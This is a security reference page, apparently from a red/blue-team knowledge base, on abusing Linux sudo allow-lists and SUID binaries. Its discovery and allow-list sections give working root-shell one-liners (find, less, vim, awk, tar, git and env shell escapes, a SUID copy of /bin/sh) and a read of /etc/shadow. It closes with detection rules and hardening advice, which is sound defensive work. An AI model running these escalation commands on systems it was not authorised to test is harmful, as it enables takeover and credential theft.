# GTFOBins - Linux sudo / SUID Abuse

| Field | Value |
|---|---|
| `evasion_ids` | EV-LNX-0001, EV-LNX-0007, EV-LNX-0008 |
| `attack_ids` | T1548.003 |
| `cwe_id` | CWE-250, CWE-732 |
| `module` | `exploit/linux/sudo/local` |
| `detections` | `06-defense/wazuh/rules/1010-linux.rules`, `06-defense/sigma/ssa_linux_find_exec.yml` |

## 1. Discovery

```bash
sudo -l                                   # what is allowed without a password?
sudo -l -U user                           # for other accounts
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
find / -perm -2000 -type f 2>/dev/null    # SGID binaries
```

## 2. Allow-list abuse

Any allowed binary that reads its command line, reads a file of our choosing,
or spawns a shell escalates:

```bash
sudo find . -exec /bin/sh -p \; -quit      # EV-LNX-0001
sudo less /etc/shadow                      # then type  !sh     EV-LNX-0012
sudo cp /bin/sh /tmp/x && sudo chmod u+s /tmp/x && /tmp/x   EV-LNX-0008
sudo awk 'BEGIN {system("/bin/sh")}'       # EV-LNX-0004
sudo vim -c ':!/bin/sh' /etc/passwd         # EV-LNX-0002
sudo tar -cf /dev/shm/x.tar --checkpoint=1 --checkpoint-action=exec=/bin/sh /etc
sudo git -c core.pager='sh -c sh' diff
sudo env /bin/sh
```

### Wordlist-backed discovery

```bash
# every GTFOBins binary, tested against the discovered NOPASSWD list
comm -12 <(sudo -l | grep -oE '/(usr/)?(s)?bin/[a-zA-Z0-9._-]+' | sort -u) \
         03-wordlists/network/binaries-linux.txt
```

## 3. SUID misconfiguration

```bash
find / -perm -4000 -type f 2>/dev/null | while read -r b; do
  strings "$b" 2>/dev/null | grep -qE '^(sh|bash|env|perl|python)' \
    && echo "INTERESTING: $b"
done
```

## 4. Detection

| Signal | Source | Rule |
|---|---|---|
| SUID shell copy into a world-writable dir | file integrity | `ssa_linux_suid_shell_copy.yml` |
| `find`/`vim`/`awk` executing `/bin/sh` | audit execve | `ssa_linux_find_exec.yml` |
| `sudo` run by a non-interactive service | auth.log | `ssa_linux_sudo_nonshell.yml` |
| New SUID bit set | audit (chmod) | `ssa_linux_suid_created.yml` |
| `/etc/shadow` read by non-root process | eBPF/audit | custom - FIM rule |

Audit rule (classic format):

```
-w /etc/shadow -p wa -k shadow_read
-a always,exit -F arch=b64 -S execve -F euid=0 -F path=/usr/bin/find -k ssa_sudo_find
```

## 5. Hardening

* Never grant `NOPASSWD` on anything that can execute a command: `find`, `awk`,
  `vi`, `less`, `env`, `tar`, `rsync`, `zip`, `git`, `docker`, `systemctl`.
* Prefer `sudoedit` over `sudo vi` for config edits.
* Remove SUID from shells and interpreters.
* Audit: `auditd` execve rules on the allowed binary list, regenerated from
  `04-evasion/index/evasion-index.csv` by `11-automation/scripts/`.
